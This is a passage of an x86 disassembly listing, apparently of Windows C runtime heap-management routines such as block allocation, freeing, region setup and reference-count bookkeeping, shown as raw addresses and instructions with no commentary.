  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
